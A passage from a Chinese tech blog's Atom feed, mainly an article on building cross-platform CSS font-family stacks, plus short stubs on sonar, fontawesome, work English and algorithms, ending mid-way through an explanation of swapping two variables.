    <summary type="html">&lt;p&gt;sonar是一款静态代码质量分析工具，支持Java、Python、PHP、JavaScript、CSS等25种以上的语言，而且能够集成在IDE、Jenkins、Git等服务中，方便随时查看代码质量分析报告；&lt;/p&gt;
&lt;p&gt;sonar通过配置的代码分析规则，从可靠性、安全性、</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="sonar" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/sonar/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="sonar" scheme="https://seniortesting.club/tags/sonar/"/>
    
    <category term="代码质量" scheme="https://seniortesting.club/tags/%E4%BB%A3%E7%A0%81%E8%B4%A8%E9%87%8F/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>如何使用fontawesome字体</title>
    <link href="https://seniortesting.club/posts/xtDwjrA3Y5/"/>
    <id>https://seniortesting.club/posts/xtDwjrA3Y5/</id>
    <published>2021-03-26T01:06:53.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>参考来源: <a href="https://segmentfault.com/a/1190000013173840" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013173840</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h2&gt;&lt;p&gt;参考来源: &lt;a href=&quot;https://segmentfault.com/a/1190000013173840&quot; target=&quot;_b</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="css" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/css/"/>
    
    
  </entry>
  
  <entry>
    <title>如何优雅的选择字体font-family</title>
    <link href="https://seniortesting.club/posts/7170b080/"/>
    <id>https://seniortesting.club/posts/7170b080/</id>
    <published>2021-03-26T01:06:53.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>大家都知道，在不同操作系统、不同游览器里面默认显示的字体是不一样的，并且相同字体在不同操作系统里面渲染的效果也不尽相同，那么如何设置字体显示效果会比较好呢？</p><h2 id="首先我们看看各平台的默认字体情况"><a href="#首先我们看看各平台的默认字体情况" class="headerlink" title="首先我们看看各平台的默认字体情况"></a>首先我们看看各平台的默认字体情况</h2><h3 id="1、-Window下"><a href="#1、-Window下" class="headerlink" title="1、 Window下"></a>1、 Window下</h3><p>宋体（SimSun）：Win下大部分游览器的默认字体，宋体在小字号下（如12px、14px）的显示效果还可以接受，但是字号一大就非常糟糕了，所以使用的时候要注意。</p><p>微软雅黑（”Microsoft Yahei”）：从 Vista 开始，微软提供了这款新的字体，一款无衬线的黑体类字体，并且拥有 Regular、Bold 两种粗细的字重，显著提高了字体的显示效果。现在这款字体已经成为Windows游览器中最值得使用的中文字体。从Win8开始，微软雅黑又加入了 Light 这款更细的字重，对于喜欢细字体的设计、开发人员又多了一个新的选择。</p><p>Arial：Win平台上默认的无衬线西文字体（为什么要说英文字体后面会解释），有多种变体，显示效果一般。</p><p>Tahoma：十分常见的无衬线字体，被采用为Windows 2000、Windows XP、Windows Server 2003及Sega游戏主机Dreamcast等系统的预设字型，显示效果比Arial要好。</p><p>Verdana：无衬线字体，优点在于它在小字上仍结构清晰端整、阅读辨识容易。</p><p>其他：Windows 下默认字体列表：微软官网、维基百科、Office字体</p><p>结论：<strong>微软雅黑为Win平台上最值得选择的中文字体，但非游览器默认，需要设置</strong>；<strong>西文字体的选择以Arial、Tahoma等无衬线字体为主。</strong></p><h3 id="2、Mac-OS下"><a href="#2、Mac-OS下" class="headerlink" title="2、Mac OS下"></a>2、Mac OS下</h3><p>华文黑体（STHeiti）、华文细黑（STXihei）：属于同一字体家族系列，OS X 10.6 之前的简体中文系统界面默认字体，也是目前Chrome游览器下的默认字体，有 Regular 和 Bold 两个字重，显示效果可以接受，华文细黑也曾是我最喜欢的字体之一。</p><p>黑体-简（Heiti SC）：从 10.6 开始，黑体-简代替华文黑体用作简体中文系统界面默认字体，苹果生态最常用的字体之一，包括iPhone、iPad等设备用的也是这款字体，显示效果不错，但是喇叭口设计遭人诟病。</p><p>冬青黑体（ Hiragino Sans GB ）：听说又叫苹果丽黑，日文字体Hiragino KakuGothic的简体中文版，简体中文有 常规体和 粗体 两种，冬青黑体是一款清新的专业印刷字体，小字号时足够清晰，拥有很多人的追捧。</p><p>Times New Roman：Mac平台Safari下默认的字体，是最常见且广为人知的西文衬线字体之一，众多网页浏览器和文字处理软件都是用它作为默认字体。</p><p>Helvetica、Helvetica Neue：一种被广泛使用的传奇般的西文字体（这货还有专门的记录片呢），在微软使用山寨货的Arial时，乔布斯却花费重金获得了Helvetica苹果系统上的使用权，因此该字体也一直伴随着苹果用户，是苹果生态中最常用的西文字体。Helvetica Neue为Helvetica的改善版本，且增加了更多不同粗细与宽度的字形，共拥有51种字体版本，极大的满足了日常的使用。</p><p>苹方（PingFang SC）：在Mac OS X EL Capitan上，苹果为中国用户打造了一款全新中文字体–苹方，去掉了为人诟病的喇叭口，整体造型看上去更加简洁，字族共六枚字体：极细体、纤细体、细体、常规体、中黑体、中粗体。</p><p>San Francisco：同样是Mac OS X EL Capitan上最新发布的西文字体，感觉和Helvetica看上去差别不大，目前已经应用在Mac OS 10.11+、iOS 9.0+、watch OS等最新系统上。</p><p>其他：Mac下默认字体列表：苹果官网、维基百科</p><p>结论：<strong>目前苹方和San Francisco为苹果推出的最新字体，显示效果也最为优雅，但只有最新系统才能支持，而黑体-简和Helvetica可以获得更多系统版本支持，显示效果也相差无几，可以接受。</strong></p><h3 id="3、Android系统"><a href="#3、Android系统" class="headerlink" title="3、Android系统"></a>3、Android系统</h3><p>Droid Sans、Droid Sans Fallback：Droid Sans为安卓系统中默认的西文字体，是一款人文主义无衬线字体，而Droid Sans Fallback则是包含汉字、日文假名、韩文的文字扩展支持。</p><p>结论：<strong>Droid Sans为默认的字体，并结合了中英文，无需单独设置。</strong></p><h3 id="4、iOS系统"><a href="#4、iOS系统" class="headerlink" title="4、iOS系统"></a>4、iOS系统</h3><p>iOS系统的字体和Mac OS系统的字体相同，保证了Mac上的字体效果，iOS设备就没有太大问题。</p><h3 id="5、Linux"><a href="#5、Linux" class="headerlink" title="5、Linux"></a>5、Linux</h3><p>文泉驿点阵宋体：类似宋体的衬线字体，一般不推荐使用。</p><p>文泉驿微米黑：几乎是 Linux 社区现有的最佳简体中文字体。</p><h2 id="选择字体需要注意的问题"><a href="#选择字体需要注意的问题" class="headerlink" title="选择字体需要注意的问题"></a>选择字体需要注意的问题</h2><h3 id="1、字体的中英文写法"><a href="#1、字体的中英文写法" class="headerlink" title="1、字体的中英文写法"></a>1、字体的中英文写法</h3><p>我们在操作系统中常常看到宋体、微软雅黑这样的字体名称，但实际上这只是字体的显示名称，而不是字体文件的名称，一般字体文件都是用英文命名的，如SimSun、Microsoft Yahei。在大多数情况下直接使用显示名称也能正确的显示，但是有一些用户的特殊设置会导致中文声明无效。<br>因此，<strong>保守的做法是使用字体的字体名称（英文）或者两者兼写</strong>。如下示例：</p><p>font-family: STXihei, “Microsoft YaHei”;<br>font-family: STXihei, “华文细黑”, “Microsoft YaHei”, “微软雅黑”;</p><h2 id="2、声明英文字体"><a href="#2、声明英文字体" class="headerlink" title="2、声明英文字体"></a>2、声明英文字体</h2><p>绝大部分中文字体里都包含英文字母和数字，不进行英文字体声明是没有问题的，但是大多数中文字体中的英文和数字的部分都不是特别漂亮，所以建议也对英文字体进行声明。<br>由于英文字体中大多不包含中文，我们可以先进行英文字体的声明，这样不会影响到中文字体的选择，<strong>因此优先使用最优秀的英文字体，中文字体声明则紧随其次</strong>。如下示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: Arial, <span class="string">&quot;Microsoft YaHei&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="3、照顾不同的操作系统"><a href="#3、照顾不同的操作系统" class="headerlink" title="3、照顾不同的操作系统"></a>3、照顾不同的操作系统</h3><p><strong>英文、数字部分</strong>：在默认的操作系统中，Mac和Win都会带有Arial, Verdana, Tahoma等几个预装字体，从显示效果来看，<strong>Tahoma要比Arial更加清晰一些，因此字体设置Tahoma最好放到前面，当找不到Tahoma时再使用Arial</strong>；而在Mac中，还拥有一款更加漂亮的Helvetica字体，所以为了照顾Mac用户有更好的体验，<strong>应该更优先设置Helvetica字体</strong>；Android系统下默认的无衬线字体就可以接受，因此无需单独设置。最后，英文、数字字体的最佳写法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: Helvetica, Tahoma, Arial;</span><br></pre></td></tr></table></figure><p><strong>中文部分</strong>：在Win下，微软雅黑为大部分人最常使用的中文字体，由于很多人安装Office的缘故，Mac电脑中也会出现微软雅黑字体，因此把显示效果不错的微软雅黑加入到字体列表是个不错的选择；同样，为了保证Mac中更为优雅字体苹方（PingFang SC）、黑体-简（Heiti SC）、冬青黑体（ Hiragino Sans GB ）的优先显示，需要把这些字体放到中文字体列表的最前面；同时为了照顾到Linux操作系统的体验，还需要添加文泉驿微米黑字体。最后，中文字体部分最佳写法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>;</span><br></pre></td></tr></table></figure><p>中英文整合写法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: Helvetica, Tahoma, Arial, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>;</span><br><span class="line"><span class="attribute">font-family</span>: Helvetica, Tahoma, Arial, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="4、注意向下兼容"><a href="#4、注意向下兼容" class="headerlink" title="4、注意向下兼容"></a>4、注意向下兼容</h3><p>如果还需要考虑旧版本操作系统用户的话，不得不加上一些旧版操作系统存在的字体：Mac中的华文黑体、冬青黑体，Win中的黑体等。同样按照显示效果排列在列表后面，写法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: Helvetica, Tahoma, Arial, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, STXihei, <span class="string">&quot;MicrosoftYaHei&quot;</span>, SimHei, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>;</span><br></pre></td></tr></table></figure><p>加入了 STXihei（华文细黑）和 SimHei（黑体）。</p><h3 id="5、补充字体族名称"><a href="#5、补充字体族名称" class="headerlink" title="5、补充字体族名称"></a>5、补充字体族名称</h3><p>字体族大体上分为两类：sans-serif（无衬线体）和serif（衬线体），当所有的字体都找不到时，我们可以使用字体族名称作为操作系统最后选择字体的方向。一般非衬线字体在显示器中的显示效果会比较好，因此我们需要在最后添加 sans-serif，写法如下：。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: Helvetica, Tahoma, Arial, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>, sans-serif;</span><br></pre></td></tr></table></figure><h2 id="我们看一下大公司的常见写法"><a href="#我们看一下大公司的常见写法" class="headerlink" title="我们看一下大公司的常见写法"></a>我们看一下大公司的常见写法</h2><h3 id="1-小米"><a href="#1-小米" class="headerlink" title="1. 小米"></a>1. 小米</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">1.5</span> <span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,<span class="string">&quot;Microsoft Yahei&quot;</span>,<span class="string">&quot;Hiragino Sans GB&quot;</span>,<span class="string">&quot;Heiti SC&quot;</span>,<span class="string">&quot;WenQuanYiMicro Hei&quot;</span>,sans-serif;</span><br></pre></td></tr></table></figure><p>小米公司优先使用Helvetica Neue这款字体以保证最新版本Mac用户的最佳体验，选择了Arial作为Win下默认英文字体及Mac的替代英文字体；中文字体方面首选了微软雅黑，然后选择了冬青黑体及黑体-简作为Mac上的替代方案；最后使用文泉驿微米黑兼顾了Linux系统。</p><h3 id="2、淘宝"><a href="#2、淘宝" class="headerlink" title="2、淘宝"></a>2、淘宝</h3><p>鉴于淘宝网改版频率较频繁，这里截图保存了一下，点此查看。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font</span>: <span class="number">12px</span>/<span class="number">1.5</span> tahoma,arial,<span class="string">&#x27;Hiragino Sans GB&#x27;</span>,<span class="string">&#x27;\5b8b\4f53&#x27;</span>,sans-serif;</span><br></pre></td></tr></table></figure><p>其实从图中明显看出淘宝网的导航及内容有着大量的衬线字体，鉴于淘宝网站大部分字号比较小，显示效果也还可以接受。代码中可以看出淘宝使用了<code>Tahoma、Arial</code>作为首选英文字体，中文字体首选了<code>冬青黑体</code>，由于Win下没有预装该款字体，所以显示出了后面的宋体（5b8b4f53为汉字宋体用 unicode 表示的写法，不用SimSun是因为 Firefox 的某些版本和 Opera 不支持 SimSun的写法）</p><h3 id="3、简书"><a href="#3、简书" class="headerlink" title="3、简书"></a>3、简书</h3><p>最新更新字体库: 2021/03/26</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: -apple-system,BlinkMacSystemFont,<span class="string">&quot;Apple Color Emoji&quot;</span>,<span class="string">&quot;Segoe UI Emoji&quot;</span>,<span class="string">&quot;Segoe UI Symbol&quot;</span>,<span class="string">&quot;Segoe UI&quot;</span>,<span class="string">&quot;PingFang SC&quot;</span>,<span class="string">&quot;Hiragino Sans GB&quot;</span>,<span class="string">&quot;Microsoft YaHei&quot;</span>,<span class="string">&quot;WenQuanYi Micro Hei&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br></pre></td></tr></table></figure><p>旧字体库</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;lucida grande&quot;</span>, <span class="string">&quot;lucida sans unicode&quot;</span>, lucida, helvetica, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>, sans-serif;</span><br></pre></td></tr></table></figure><p>自认为简书的阅读体验很棒，我们看看简书所用的字体，简书优先选择了<code>lucida</code>家族的系列字体作为英文字体，该系列字体在Mac和Win上都是预装的，并且有着不俗的表现；中文字体方面将冬青黑体作为最优先使用的字体，同样考虑了Linux系统。</p><h3 id="4、今日头条"><a href="#4、今日头条" class="headerlink" title="4、今日头条"></a>4、今日头条</h3><p>最新更新字体库: 2021/03/06</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: PingFang SC,Hiragino Sans GB,Microsoft YaHei,WenQuanYi Micro Hei,Helvetica Neue,Arial,sans-serif;</span><br></pre></td></tr></table></figure><h2 id="其他的一些注意点"><a href="#其他的一些注意点" class="headerlink" title="其他的一些注意点"></a>其他的一些注意点</h2><p>1、字体何时需要添加引号<br>当字体具体某个取值中若有一种样式名称包含空格，则需要用双引号或单引号表示，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;Arial Narrow&quot;</span>, sans-serif;</span><br></pre></td></tr></table></figure><p>如果书写中文字体名称为了保证兼容性也会添加引号，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;黑体-简&quot;</span>, <span class="string">&quot;微软雅黑&quot;</span>, <span class="string">&quot;文泉驿微米黑&quot;</span>;</span><br></pre></td></tr></table></figure><p>2、引用外部字体<br>大多数的中文字体由于版权原因不能随意使用，这里推荐一个免版权而且漂亮的中文字体<code>思源黑体</code>，该字体为Adobe与Google推出的一款开源字体， 有七种字体粗细（ExtraLight、Light、Normal、Regular、Medium、Bold 和 Heavy），完全支持日文、韩文、繁体中文和简体中文，字形优美，依稀记得小米公司好像有使用过。<br><strong>鉴于中文字体的体积比较大（一般字库全一点的中文字体动辄几Mb），所以较少人会使用外部字体，如果真的需要引入，也可以考虑通过工具根据页面文字的使用多少单独生成中文字体，以减小文件大小。</strong></p><h2 id="最后，推荐写法"><a href="#最后，推荐写法" class="headerlink" title="最后，推荐写法"></a>最后，推荐写法</h2><p>由于每个人的审美不一样，钟爱的字体也会有所有不同，这里给出我个人的常用写法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;Helvetica Neue&quot;</span>, Helvetica, Arial, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Hiragino Sans GB&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;MicrosoftYaHei&quot;</span>, <span class="string">&quot;WenQuanYi Micro Hei&quot;</span>, sans-serif;</span><br><span class="line"></span><br><span class="line"><span class="attribute">font-family</span>: -apple-system,BlinkMacSystemFont,<span class="string">&quot;Apple Color Emoji&quot;</span>,<span class="string">&quot;Segoe UI Emoji&quot;</span>,<span class="string">&quot;Segoe UI Symbol&quot;</span>,<span class="string">&quot;Segoe UI&quot;</span>,<span class="string">&quot;PingFang SC&quot;</span>,<span class="string">&quot;Hiragino Sans GB&quot;</span>,<span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>,<span class="string">&quot;WenQuanYi Micro Hei&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大家都知道，在不同操作系统、不同游览器里面默认显示的字体是不一样的，并且相同字体在不同操作系统里面渲染的效果也不尽相同，那么如何设置字体显示效果会比较好呢？&lt;/p&gt;
&lt;h2 id=&quot;首先我们看看各平台的默认字体情况&quot;&gt;&lt;a href=&quot;#首先我们看看各平台的默认字体情况&quot; </summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="css" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/css/"/>
    
    
  </entry>
  
  <entry>
    <title>常用工作英语词汇整理</title>
    <link href="https://seniortesting.club/posts/HSgCdpSxi2/"/>
    <id>https://seniortesting.club/posts/HSgCdpSxi2/</id>
    <published>2021-03-26T01:05:21.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>整理了一份外企的一些高频常用的英语语句和词汇.</p></blockquote><p>词汇 |中文 |<br>———|———-|———<br> PTO | 休假 |</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;整理了一份外企的一些高频常用的英语语句和词汇.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;词汇 |中文 |&lt;br&gt;———|———-|———&lt;br&gt; PTO | 休假 |&lt;/p&gt;
</summary>
      
    
    
    
    <category term="商业英语" scheme="https://seniortesting.club/categories/%E5%95%86%E4%B8%9A%E8%8B%B1%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-图论-最小生成树</title>
    <link href="https://seniortesting.club/posts/28Hu6VNVNI/"/>
    <id>https://seniortesting.club/posts/28Hu6VNVNI/</id>
    <published>2021-03-25T15:26:06.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="图论" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-图论-最短路径</title>
    <link href="https://seniortesting.club/posts/7atTxFiiJz/"/>
    <id>https://seniortesting.club/posts/7atTxFiiJz/</id>
    <published>2021-03-25T15:26:00.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="图论" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-图论-网络流建模</title>
    <link href="https://seniortesting.club/posts/SyS29bm0gA/"/>
    <id>https://seniortesting.club/posts/SyS29bm0gA/</id>
    <published>2021-03-25T15:25:52.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="图论" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-搜索-剪枝</title>
    <link href="https://seniortesting.club/posts/wLf3yogzns/"/>
    <id>https://seniortesting.club/posts/wLf3yogzns/</id>
    <published>2021-03-25T15:24:45.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="搜索" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%90%9C%E7%B4%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-搜索-回溯</title>
    <link href="https://seniortesting.club/posts/UD3E1cMmc1/"/>
    <id>https://seniortesting.club/posts/UD3E1cMmc1/</id>
    <published>2021-03-25T15:24:20.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="搜索" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%90%9C%E7%B4%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-搜索-递归</title>
    <link href="https://seniortesting.club/posts/DO1T2tTz1t/"/>
    <id>https://seniortesting.club/posts/DO1T2tTz1t/</id>
    <published>2021-03-25T15:24:14.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="搜索" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%90%9C%E7%B4%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-排序-快排</title>
    <link href="https://seniortesting.club/posts/rxd2imcUxx/"/>
    <id>https://seniortesting.club/posts/rxd2imcUxx/</id>
    <published>2021-03-25T15:24:00.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="两个数交换"><a href="#两个数交换" class="headerlink" title="两个数交换"></a>两个数交换</h2><h3 id="1、借助中间量交换-（开发常用）"><a href="#1、借助中间量交换-（开发常用）" class="headerlink" title="1、借助中间量交换 （开发常用）"></a>1、借助中间量交换 （开发常用）</h3><p>int x = 10; <br>int y = 20; <br>int temp = x; <br>x = y; <br>y = temp; </p><p>此种方法可以将中间量看成空杯，即把temp看成是空杯， <br>把x看成是装有白酒的杯子，把y看成是装有红酒的杯子 </p><p>int temp = x; 把白酒倒到空杯中，此时temp装有白酒，x变成空杯 <br>x = y; 把y中的红酒倒到x空杯中，此时x装有红酒，y变成空杯 <br>y = temp; 把白酒倒到y空杯中，此时x装有红酒，y装有白酒，实现x和y的互换 </p><h3 id="2、位移运算交换-（面试常用）"><a href="#2、位移运算交换-（面试常用）" class="headerlink" title="2、位移运算交换 （面试常用）"></a>2、位移运算交换 （面试常用）</h3><p>int x = 10; <br>int y = 20; <br>x = x ^ y; <br>y = x ^ y; <br>x = x ^ y;</p><p>此种方法运用这种原理：一个数对另一个数位异或两次，该数不变</p><p>x = x ^ y;  此时x的值为x ^ y;<br>y = x ^ y;  此时的x经上面的运算变成x ^ y，所以y =  x ^ y ^ y = x;<br>x = x ^ y;  此时的y经上面的运算变成 x，所以x =  x ^ y ^ x = y; 实现两个数的互换 </p><h3 id="3、数值相加减交换"><a href="#3、数值相加减交换" class="headerlink" title="3、数值相加减交换"></a>3、数值相加减交换</h3><p>int x = 10; <br>int y = 20; <br>x = x + y; <br>y = x - y; <br>x = x - y; </p><p>此种方法通过先求得两数的和再进行减运算 </p><p>x = x + y; 此时x的值为10+20=30; <br>y = x - y; 此时的x经上面的运算变成30，所以y = 30 - 20 = 